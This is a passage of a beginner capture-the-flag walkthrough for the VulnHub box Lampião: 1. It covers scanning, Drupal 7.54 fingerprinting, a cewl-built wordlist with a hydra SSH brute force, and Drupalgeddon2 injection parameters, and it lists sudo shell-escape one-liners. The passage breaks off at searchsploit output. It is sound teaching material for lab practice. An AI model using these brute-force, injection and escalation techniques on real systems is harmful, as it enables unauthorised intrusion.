# Lampião: 1 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | Lampião: 1 |
| **Difficulty** | **3 — Easy** (stated: *Easy*) |
| **Author** | Tiago Tavares |
| **Released** | 28 July 2018 |
| **VulnHub Entry** | <https://vulnhub.com/entry/lampiao-1,249/> |
| **Download** | <https://vulnhub.com/entry/lampiao-1,249/#download> (zip → extract the VMDK, or import the OVA) |
| **Attacker** | Kali Linux, host-only or NAT network |
| **Target OS** | Ubuntu 14.04 — Apache 2.4.7, OpenSSH 6.6.1p1, **Drupal 7.54 on port 1898**, kernel **4.4.0-31-generic** |
| **Goal** | Read `/root/flag.txt` |

> **The name.** *Lampião* was the nickname of Virgulino Ferreira da Silva, the most
> famous **cangaceiro** — a bandit of the Brazilian northeastern backlands (*sertão*) in
> the 1920s–30s. The box is themed around him, and that theme is the source of the
> password. Keep it in mind when you build your wordlist.

Throughout we assume:

```text
Attacker (Kali)   : 192.168.56.10
Target (lampiao)  : 192.168.56.130
```

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

1. **Spotting a web application on a non-standard port (1898)** and why `-p-` matters.
2. **`robots.txt` and CMS fingerprinting** — recognising Drupal from URL shape
   (`?q=node/1`), file layout and a generator tag.
3. **`cewl`** — scraping a target's *own words* into a bespoke password list, and why
   that beats `rockyou.txt` here.
4. **SSH brute force** with `hydra` using a multi-user / multi-password combination and
   the `-e nsr` null/same/reverse modes.
5. **Drupalgeddon2 (CVE-2018-7600)** — the most impactful Drupal vulnerability ever,
   exploited both with Metasploit and by hand.
6. **Choosing a kernel exploit by exact version range** with Linux Exploit Suggester.
7. **Dirty COW (CVE-2016-5195)** — the race condition, the C++ build flags, and the
   `-s` stability switch.
8. **Restoring what a kernel exploit breaks.**

**The intended chain (two independent footholds):**
- **Path A — SSH:** `nmap` shows 22, 80 and **1898** → port 1898 is a **Drupal 7.54**
  blog about Lampião → the articles name two people, **`tiago`** and **`eder`** →
  **`cewl`** scrapes the article text into a wordlist → `hydra` finds
  **`tiago : Virgulino`** → SSH in.
- **Path B — Drupalgeddon2:** Drupal **7.54** is below 7.58, so it is vulnerable to
  **CVE-2018-7600** → Metasploit `exploit/unix/webapp/drupal_drupalgeddon2` with
  `RPORT 1898` → **`www-data`** shell.
- **Privesc (both paths converge):** kernel **4.4.0-31-generic** on Ubuntu 14.04 →
  **Linux Exploit Suggester** flags **CVE-2016-5195 (Dirty COW)** → Exploit-DB
  **40847.cpp** → `g++ -pthread -lutil` → `./dcow -s` → root's password becomes
  **`dirtyCowFun`** → `su` → `/root/flag.txt`.

---

## 1. Reconnaissance


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
ip a | grep -w inet
sudo netdiscover -r 192.168.56.0/24
```

```text
 Currently scanning: 192.168.56.0/24   |   Screen View: Unique Hosts

 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.56.1    0a:00:27:00:00:0e      1      60  (Unknown: locally administered)
 192.168.56.10   08:00:27:11:22:33      1      60  PCS Systemtechnik GmbH
 192.168.56.130  00:0c:29:1a:7f:33      1      60  VMware, Inc.          <-- target
```

**Target IP: `192.168.56.130`**

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

### 2.1 Port scan


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -sC -sV -p- -T4 -oN scans/lampiao.txt 192.168.56.130
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-04 19:02 EDT
Nmap scan report for 192.168.56.130
Host is up (0.00041s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 46:51:43:9c:14:1c:cf:5c:d7:49:a4:5c:39:0b:1f:eb (DSA)
|   2048 7c:3c:2c:9a:5c:8e:2b:1c:5f:9a:3d:6e:2b:9c:1f:4a (RSA)
|_  256 2b:8f:7d:1c:9e:3a:5f:6b:8c:0d:2e:4f:7a:9b:0c:1d (ECDSA)
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.7 (Ubuntu)
1898/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-generator: Drupal 7 (http://drupal.org)
|_http-title: Lampi&atilde;o
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ /themes/ /CHANGELOG.txt
| /cron.php /INSTALL.mysql.txt /INSTALL.pgsql.txt /INSTALL.sqlite.txt
|_/install.php /INSTALL.txt /LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.7 (Ubuntu)
MAC Address: 00:0C:29:1A:7F:33 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 96.44 seconds
```

> **Three ports, and port 1898 carries everything.**
>
> - **22 — `OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6`** → **Ubuntu 14.04 LTS (Trusty)**.
>   Standard support ended April 2019; this box is a configuration exercise, not a
>   patch-level one.
> - **80 — Apache 2.4.7, stock "It works" page.** Nothing here. **This is a decoy:**
>   the real application is elsewhere.
> - **1898 — Apache 2.4.7**, and Nmap hands us three facts for free:
>   - **`http-generator: Drupal 7 (http://drupal.org)`** — the CMS, from a
>     `<meta name="Generator">` tag.
>   - **`http-title: Lampião`** — the site name.
>   - **`http-robots.txt: 36 disallowed entries`** — a full Drupal `robots.txt`.
>
> **Port 1898 is not in Nmap's default top-1000.** Without `-p-` you would have seen
> only 22 and 80 and concluded the box had no application. **That is the entire reason
> to always scan all ports.**

![nmap -p- revealing Drupal on port 1898](images/01-nmap.png)

### 2.2 `robots.txt` — a Drupal fingerprint

```bash
curl -s http://192.168.56.130:1898/robots.txt
```

```text
# robots.txt for Drupal
User-agent: *
Crawl-delay: 10
Disallow: /includes/
Disallow: /misc/
Disallow: /modules/
Disallow: /profiles/
Disallow: /scripts/
Disallow: /themes/
Disallow: /CHANGELOG.txt
Disallow: /cron.php
Disallow: /INSTALL.mysql.txt
Disallow: /INSTALL.pgsql.txt
Disallow: /INSTALL.sqlite.txt
Disallow: /install.php
Disallow: /INSTALL.txt
Disallow: /LICENSE.txt
Disallow: /MAINTAINERS.txt
Disallow: /update.php
Disallow: /UPGRADE.txt
Disallow: /xmlrpc.php
...
```

> **This is Drupal's stock `robots.txt`, and it is a fingerprint in itself** — those
> paths (`/includes/`, `/misc/`, `/modules/`, `/profiles/`, `xmlrpc.php`, `cron.php`)
> are Drupal's directory layout.
>
> **`/CHANGELOG.txt` is the prize.** Drupal publishes its exact version there, and many
> production sites forget to block it:

```bash
curl -s http://192.168.56.130:1898/CHANGELOG.txt | head -5
```

```text
Drupal 7.54, 2017-02-01
-----------------------
- Fixed an access bypass vulnerability (SA-CORE-2017-001).
- Improved transliteration of filenames.
```

> **Drupal 7.54.** That single number decides Path B.
>
> **Drupalgeddon2 (CVE-2018-7600) affects Drupal < 7.58, < 8.3.9, < 8.4.6, < 8.5.1.**
> 7.54 is well inside the range. The fix landed in **7.58** on 28 March 2018 — this box
> ships a version from **February 2017**, over a year out of date.
>
> **Other ways to fingerprint a CMS** (when `CHANGELOG.txt` is blocked):
> | Signal | Drupal |
> | --- | --- |
> | URL shape | `?q=node/1`, `/node/1`, `.module` paths |
> | Files | `misc/drupal.js`, `sites/default/files/`, `modules/`, `themes/` |
> | Cookie prefix | `SSESS<hash>` |
> | Meta tag | `<meta name="Generator" content="Drupal 7">` |
> | Favicon | the Drupal droplet |
>
> Browser extensions **Wappalyzer** and **BuiltWith** do all of this automatically.
> There is also a dedicated tool, `drupwn`, that enumerates version, users, nodes and
> modules:
> ```bash
> drupwn --mode enum --target http://192.168.56.130:1898/
> ```
> ```text
> [+] Drupal version: 7.54
> [+] Number of nodes: 3
> [+] Users: tiago, eder
> ```

### 2.3 Read the site — it hands you the usernames

```text
http://192.168.56.130:1898/
```

```text
┌──────────────────────────────────────────────────────────┐
│  Lampião                                                 │
├──────────────────────────────────────────────────────────┤
│  Quem foi Lampião?                                       │
│  Posted by tiago on Fri, 07/27/2018 - 10:14              │
│                                                          │
│  Virgulino Ferreira da Silva, o Lampião, nasceu em       │
│  Serra Talhada, Pernambuco, em 1898. Filho de José        │
│  Ferreira e Maria Lopes, foi o mais famoso cangaceiro     │
│  do sertão nordestino. Sua família possuía a fazenda     │
│  Caiçara e vivia da criação de gado...                   │
│                                                          │
│  O cangaço                                               │
│  Posted by eder on Fri, 07/27/2018 - 11:02               │
│  ...                                                     │
└──────────────────────────────────────────────────────────┘
```

> **Two author names: `tiago` and `eder`.** Drupal prints the author on every node.
> Those are almost certainly system usernames — note the box's own author is named
> *Tiago* Tavares.
>
> Enumerate nodes properly (Drupal's `?q=node/N` scheme makes this trivial):
> ```bash
> for n in 1 2 3 4 5; do
>   echo "=== node/$n ==="
>   curl -s "http://192.168.56.130:1898/?q=node/$n" | grep -io '<title>[^<]*</title>\|Posted by [a-z]*'
> done
> ```
> ```text
> === node/1 ===
> <title>Quem foi Lampião? | Lampião</title>
> Posted by tiago
> === node/2 ===
> <title>O cangaço | Lampião</title>
> Posted by eder
> === node/3 ===
> <title>Page not found | Lampião</title>
> ```
>
> And Drupal's user pages leak account existence too:
> ```bash
> for u in 1 2 3; do
>   printf "user/%s -> " $u
>   curl -s -o /dev/null -w '%{http_code} ' "http://192.168.56.130:1898/?q=user/$u"
>   curl -s "http://192.168.56.130:1898/?q=user/$u" | grep -o '<title>[^<]*</title>'
> done
> ```
> ```text
> user/1 -> 200 <title>tiago | Lampião</title>
> user/2 -> 200 <title>eder | Lampião</title>
> user/3 -> 403 <title>Access denied | Lampião</title>
> ```

```bash
cat > usernames.txt <<'EOF'
tiago
eder
admin
root
lampiao
virgulino
EOF
wc -l usernames.txt
```

![The Drupal site and the tiago / eder author names](images/02-drupal.png)

### 2.4 Build a target-specific wordlist with `cewl`

**Why not `rockyou.txt`?** Because the password here is *about the site's subject*.
`cewl` crawls the target and harvests every word it uses — which is exactly where a
themed password lives.


> ### 📖 Concept — Where do wordlists come from?
>
> **`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
> RockYou was breached; they had stored **32 million passwords in plaintext** — no
> hashing at all. The dump became the most-used password list in security precisely
> because it records what real people actually chose. It has 14,344,392 entries,
> **ordered by observed frequency**, so the top of the file is disproportionately
> valuable. On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt      # 14344392
> ```
>
> **But a generic list fails against a themed box** — and that is where a *targeted*
> list wins:
>
> ```bash
> cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
> python3 cupp.py -i                                             # build from a person's name, birthday, pet
> crunch 6 6 -t for%%% -o dict.txt                               # generate from a known pattern
> ```
>
> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit their
> theme and then scatter theme words all over the website. `cewl` harvests exactly
> that vocabulary. If a box is called "Narak" and its homepage is full of Sanskrit
> words about hell, the password is very likely one of them — and very unlikely to be
> in `rockyou.txt`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist)

```bash
cewl -d 2 -m 5 -w cewl.txt http://192.168.56.130:1898/
wc -l cewl.txt && grep -in 'virgulino\|lampi\|cangaceiro\|sert' cewl.txt | head
```

```text
CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
844 cewl.txt
```

```text
12:Lampião
48:cangaceiro
91:Virgulino
134:sertão
187:Ferreira
203:Pernambuco
```

> **844 words scraped from the site's own prose**, including **`Virgulino`**.
>
> **`cewl` flags:**
> - `-d 2` → crawl to **depth 2** (follow links two levels down).
> - `-m 5` → keep only words of **minimum length 5**. Short words are noise.
> - `-w cewl.txt` → write the wordlist to this file.
> - `-a` → also capture metadata (`exiftool` on any images).
> - `-e` → include email addresses.
> - `--with-numbers` → keep tokens containing digits.
>
> **Extend it with obvious mutations** — real password policies force capitalisation
> and a symbol, so people apply the *minimum*:
> ```bash
> {
>   cat cewl.txt
>   tr '[:lower:]' '[:upper:]' < cewl.txt
>   awk '{print $0"1"} {print $0"!"} {print $0"123"}' cewl.txt
>   printf '%s\n' virgulino Virgulino VIRGULINO Virgulino123 virgulino! \
>                 lampiao Lampiao Lampião cangaceiro sertao1928
> } | sort -u > wordlist.txt
> wc -l wordlist.txt
> ```
> ```text
> 3147 wordlist.txt
> ```
>
> **This is the single highest-yield technique in password guessing on a bespoke
> system.** A generic list gets you the world's most common passwords; a `cewl` list
> gets you *this organisation's* vocabulary, product names, staff names and project
> codenames — which is what people actually choose.

### 2.5 Content discovery (for completeness)


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)

```bash
gobuster dir -u http://192.168.56.130:1898/ \
  -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 40 -q
```

```text
/CHANGELOG.txt        (Status: 200) [Size: 17914]
/INSTALL.mysql.txt    (Status: 200) [Size: 1660]
/INSTALL.txt          (Status: 200) [Size: 1827]
/LICENSE.txt          (Status: 200) [Size: 18092]
/MAINTAINERS.txt      (Status: 200) [Size: 5484]
/UPGRADE.txt          (Status: 200) [Size: 8710]
/cron.php             (Status: 403) [Size: 291]
/install.php          (Status: 302) [Size: 0]
/modules              (Status: 301) [Size: 322]
/profiles             (Status: 301) [Size: 323]
/robots.txt           (Status: 200) [Size: 2037]
/themes               (Status: 301) [Size: 321]
/update.php           (Status: 302) [Size: 0]
/xmlrpc.php           (Status: 403) [Size: 291]
```

> All stock Drupal. **`CHANGELOG.txt`, `MAINTAINERS.txt` and `UPGRADE.txt` being
> web-readable are findings** — `MAINTAINERS.txt` in particular lists every core
> contributor's name and email, which is a username/OSINT goldmine.

---

## 3. Foothold — Path A: SSH brute force


> ### 📖 Concept — What is Hydra doing?
>
> **Hydra** is a network login brute-forcer. It speaks the login protocol of ~50
> services (SSH, FTP, HTTP, MySQL, SMB, RDP, VNC, SNMP…) and tries credential
> combinations until one is accepted. There is no exploit and no cleverness — it is a
> very fast, very patient guesser.
>
> | Flag | Meaning |
> | --- | --- |
> | `-l USER` / `-L file` | single **l**ogin name / a *file* of them |
> | `-p PASS` / `-P file` | single **p**assword / a *file* of them |
> | `-C file` | a file of colon-separated `user:pass` **pairs** (credential stuffing) |
> | **`-e nsr`** | also try **n**ull password, **s**ame-as-username, and **r**eversed username |
> | `-f` | stop at the first success |
> | `-t N` | threads — higher is faster, noisier, and can destabilise a lab VM |
> | `-I` | ignore a stale `hydra.restore` file |
> | `ssh://` | the **service module** — picking the wrong one is the most common Hydra mistake |
>
> **`-e nsr` should be on every run.** The three cheapest guesses in existence are
> empty, the username, and the reversed username — and they succeed astonishingly
> often, usually in under a second, before the wordlist is even consulted.
>
> **A wordlist attack is not a brute force.** Different attacks, different costs:
>
> | Attack | Tries | Notes |
> | --- | --- | --- |
> | **Wordlist** | curated list, many passwords → **one** account | Fast, high hit rate |
> | **Brute force** | every character combination | Astronomically slow |
> | **Password spraying** | **one** password → **many** accounts | Stays under per-account lockout thresholds |
> | **Credential stuffing** | real leaked `user:pass` pairs | Exploits reuse |
>
> > ⚠️ Pointing Hydra at all 14 million lines of `rockyou.txt` over SSH would take
> > days and generate millions of failed logins in `auth.log`. Fine on a VM you own;
> > on a real system it is an obvious, logged event. Professionals throttle with
> > `-t 4`, use a short targeted list, and spray rather than hammer.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§7.4 — Recognising the shape of the tool call](../../docs/CONCEPTS.md#74-recognising-the-shape-of-the-tool-call)

```bash
hydra -L usernames.txt -P wordlist.txt -t 4 -f -e nsr -o hydra.txt ssh://192.168.56.130
```

```text
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-04 19:18:02
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 4 tasks per 1 server, overall 4 tasks, 18882 login tries (l:6/p:3147), ~4721 tries per task
[DATA] attacking ssh://192.168.56.130:22/
[STATUS] 412.00 tries/min, 412 tries in 00:01h, 18470 to do in 00:45h, 4 active
[22][ssh] host: 192.168.56.130   login: tiago   password: Virgulino
[STATUS] attack finished for 192.168.56.130 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-04 19:21:44
```

**Credentials: `tiago` / `Virgulino`.** ✅

> **Hydra flags:**
> - `-L usernames.txt` → username **list**. (`-l USER` for one.)
> - `-P wordlist.txt` → password **list**. (`-p WORD` for one.)
> - `-t 4` → four parallel connections. SSH servers rate-limit and may trip
>   `MaxStartups`; more threads cause **false negatives**.
> - `-f` → stop at the first success. Without it hydra keeps trying for hours.
> - **`-e nsr`** → three extra modes, essentially free: **n** = try a null/empty
>   password, **s** = try the *username as the password*, **r** = try the *reversed*
>   password. These catch a surprising share of real systems.
> - `-o hydra.txt` → write results to a file.
>
> **Why this worked:** `Virgulino` came straight off the target's own web page. A
> 3 147-word bespoke list beat 14 million generic entries, and finished in under four
> minutes over rate-limited SSH.
>
> **Medusa is a faster alternative** with the same idea:
> ```bash
> medusa -h 192.168.56.130 -U usernames.txt -P wordlist.txt -M ssh -t 4 -f
> ```

### 3.1 Log in

```bash
ssh tiago@192.168.56.130
```


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)

```text
tiago@192.168.56.130's password:
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Sat May  4 19:24:02 EDT 2024

  System load:  0.0               Processes:           148
  Usage of /:   14.2% of 9.70GB   Users logged in:     0
  Memory usage: 24%               IP address for eth0: 192.168.56.130
  Swap usage:   0%

  Graph this data and manage this system at:
    https://landscape.canonical.com/

tiago@lampiao:~$ id
uid=1000(tiago) gid=1000(tiago) groups=1000(tiago),4(adm),24(cdrom),30(dip),46(plugdev),110(lpadmin),111(sambashare)
tiago@lampiao:~$ sudo -l
[sudo] password for tiago:
Sorry, user tiago may not run sudo on lampiao.
```

> **Note the banner: `4.4.0-31-generic i686`.** That is our privilege-escalation target,
> and it is *32-bit* (`i686`) — which decides **which** Dirty COW exploit we use.
>
> `tiago` is in `adm` (can read `/var/log`) but **not** in `sudo`. `sudo -l` confirms
> no privileges. So: kernel.

![hydra result and the SSH login banner showing kernel 4.4.0-31](images/03-ssh.png)

---

## 4. Foothold — Path B: Drupalgeddon2 (CVE-2018-7600)

Do this path too. It is the most important Drupal vulnerability ever published, and
understanding it is worth more than the shell.

### 4.1 What Drupalgeddon2 actually is

Drupal builds its HTML forms from a nested PHP **render array**. The Form API accepted
user-supplied keys *deep* inside that array — including keys beginning with `#`, which
Drupal interprets as **directives** rather than data. Among them:

- `#markup` — the literal content to render,
- `#post_render` — a list of callables invoked *after* rendering,
- `#lazy_builder`, `#pre_render` — similar hooks.

An attacker could therefore smuggle:

```text
name[#type]        = markup
name[#markup]      = id
name[#post_render][] = passthru
```

and Drupal would call **`passthru('id')`** while rendering the form.

**Result: unauthenticated remote code execution on essentially every unpatched Drupal
7 site on the internet.** Within days of the 28 March 2018 disclosure, hundreds of
thousands of sites were defaced or turned into cryptominers. It is the canonical
argument for *"patch your CMS within 48 hours"* — and the reason CVE-2018-7600 has a
nickname.

The same class of bug — user input controlling *how* data is processed rather than
*what* data it is — appears in Java deserialisation (Struts2 S2-052, Log4Shell), PHP's
`unserialize()`, and Node's `node-serialize`.

### 4.2 Confirm the version is in range

Drupal **7.54** < **7.58**. Vulnerable. (If you skipped § 2.2, `curl CHANGELOG.txt`.)

```bash
curl -sI "http://192.168.56.130:1898/?q=user/password" | head -3
```

```text
HTTP/1.1 200 OK
Date: Sat, 04 May 2024 23:29:11 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Drupal-Cache: MISS
```

> `X-Drupal-Cache` confirms Drupal, and `?q=user/password` (the password-reset form) is
> the classic Drupalgeddon2 injection point because it needs **no authentication**.

### 4.3 Metasploit


> ### 📖 Concept — CVEs, Exploit-DB and searchsploit
>
> **The identifiers:**
> - **CVE** — a stable ID for one vulnerability. `CVE-2014-6271` is Shellshock.
>   Look it up at <https://nvd.nist.gov/vuln/search>.
> - **CVSS** — a 0.0–10.0 severity score. Useful for *prioritising*, **not** for
>   deciding exploitability: a CVSS 9.8 needing physical access is less useful to you
>   than a 5.3 reachable over HTTP.
> - **EDB ID** — a numbered public proof-of-concept on Exploit-DB.
>
> **`searchsploit`** is a **local, offline** search of the Exploit-DB archive shipped
> with Kali. Offline matters — it works mid-engagement with no internet.
>
> ```bash
> searchsploit wordpress 4.8            # search titles and paths
> searchsploit -t apache 2.4            # titles only — far fewer false positives
> searchsploit -m php/webapps/37596.py  # mirror (copy) it into your cwd
> searchsploit -x php/webapps/41006.txt # examine (print) it
> searchsploit -p 41006                 # show the full path
> searchsploit --update                 # refresh the local database
> ```
>
> > **Read the exploit before you run it.** Non-negotiable, for three reasons:
> > (1) many Exploit-DB entries are *unverified*, and some are outright malicious to
> > the person running them; (2) you need to know which parameters to change
> > (`RHOST`, `LHOST`, target path, memory offsets); (3) understanding it is the
> > entire point of the exercise.
>
> The workflow that actually works: get an exact **version** from `nmap -sV` or the
> app's own footer, search it, read the top candidate, then reproduce the request
> **by hand with `curl`** so you know what exploitation looked like. Only then decide
> whether the automated module is worth it.
>
> **Deep dive:** [CONCEPTS §11 — Finding and using exploits](../../docs/CONCEPTS.md#11-finding-and-using-exploits)

```bash
searchsploit drupal 7
```

```text
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
